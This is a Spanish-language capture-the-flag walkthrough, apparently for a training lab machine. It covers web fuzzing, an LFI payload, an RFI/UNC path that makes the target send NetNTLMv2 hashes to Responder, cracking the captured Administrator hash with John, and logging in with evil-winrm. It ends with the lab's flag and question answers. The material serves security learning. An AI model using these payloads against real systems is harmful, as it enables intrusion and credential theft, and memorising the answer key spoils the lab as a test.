Comprobamos la conexión con 
```bash
ping 10.129.6.172
```

Comprobamos los puertos abiertos con Nmap  (con opción -sV para ver la versión de FTP) (-O para saber el SO)
```bash
nmap -O -sCV -p- 10.129.6.172
```
Salida:
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Al entrar en el puerto 80, nos redirige a `unika.htb`. Añadimos el dominio a `/etc/hosts` para poder acceder al contenido de la página web
```bash
nano /etc/hosts
10.129.6.172      unika.htb
```

![[Responder-Puerto80.png]]

Realizamos fuzzing web para buscar directorios ocultos:
```
gobuster dir -u http://unika.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x html,php,txt


index.php            (Status: 200) [Size: 46453]
img                  (Status: 301) [Size: 328] [--> http://unika.htb/img/]
english.html         (Status: 200) [Size: 46453]
css                  (Status: 301) [Size: 328] [--> http://unika.htb/css/]
Index.php            (Status: 200) [Size: 46453]
examples             (Status: 503) [Size: 398]
js                   (Status: 301) [Size: 327] [--> http://unika.htb/js/]
English.html         (Status: 200) [Size: 46453]
french.html          (Status: 200) [Size: 47199]
german.html          (Status: 200) [Size: 46984]
licenses             (Status: 403) [Size: 417]
inc                  (Status: 301) [Size: 328] [--> http://unika.htb/inc/]
```

si intentamos cambair el idioma, accedemos a la página `http://unika.htb/index.php?page=german.html` 
Esto nos da una pista de una posible LFI
```
http://unika.htb/index.php?page=../../../../../../windows/system32/drivers/etc/hosts
```

En Windows, cuando intentas acceder a una ruta de red (como `\\10.10.10.10\compartido`), el sistema utiliza el protocolo **SMB**.Para "facilitarte" la vida, Windows intenta autenticarse automáticamente enviando tu nombre de usuario y un hash de tu contraseña (NetNTLMv2) al servidor remoto.

**Responder** es una herramienta de manipulación de red. En este escenario, creará un **servidor SMB falso** en tu máquina de atacante. Cuando la víctima intente "incluir" un archivo de tu máquina, Responder le dirá: _"Claro, pero primero dime quién eres"_, forzando al servidor Windows a enviar el desafío de autenticación.
`sudo responder -I tun0`

PHP tiene una directiva llamada `allow_url_include` que suele estar en `Off` para evitar ataques remotos por HTTP/FTP. Sin embargo, **SMB es la excepción**: muchas configuraciones de PHP en Windows siguen permitiendo rutas tipo UNC (`\\IP\recurso`) aunque esa opción esté apagada
`http://unika.htb/index.php?page=//10.10.15.188/hola.txt`

![[Responder-LFI.png]]

![[Responder-Llamada-SMB.png]]

![[Responder-herramienta.png]]

Romper el hash con John 
```
nano hash.txt  


Administrator::RESPONDER:b2e94aaa03737a33:44DE11A30D7455CEE311A32D0C8EEAF9:0101000000000000806EC4C0AA9EDC01897F3AFF1CB1C2AC0000000002000800350059003500530001001E00570049004E002D0038005A00570051003200370054003500520046004D0004003400570049004E002D0038005A00570051003200370054003500520046004D002E0035005900350053002E004C004F00430041004C000300140035005900350053002E004C004F00430041004C000500140035005900350053002E004C004F00430041004C0007000800806EC4C0AA9EDC01060004000200000008003000300000000000000001000000002000004967918948EB53E15A0ADACB07F645B52136008ABB5F2B92E15A6856EF89D6830A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100380038000000000000000000
```
Salida:
```
john -w=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2026-02-15 19:26) 50.00g/s 307200p/s 307200c/s 307200C/s 123456..iheartyou
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
```

Nos conectamos a WinRM (es como ssh para Windows)
`evil-winrm -i 10.129.8.40 -u administrator -p badminton`

![[Responder-flag.png]]

con el comando `type flag.txt` vemos el contenido del archivo
`ea81b7afddd03efaa0945333ed147fac`

---
>[!Question] When visiting the web service using the IP address, what is the domain that we are being redirected to?
unika.htb


>[!Question] Which scripting language is being used on the server to generate webpages?
php

>[!Question] What is the name of the URL parameter which is used to load different language versions of the webpage?
page
http://unika.htb/index.php?page=german.html

>[!Question] Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
> ../../../../../../../../windows/system32/drivers/etc/hosts

>[!Question] Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
> //10.10.14.6/somefile

>[!Question] What does NTLM stand for?
New Technology LAN Manager

>[!Question] Which flag do we use in the Responder utility to specify the network interface?
>-I

>[!Question] There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.
> John The Ripper

>[!Question] What is the password for the administrator user?
> badminton

>[!Question] We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
> 5985

>[!Question] Submit root flag
> ea81b7afddd03efaa0945333ed147fac



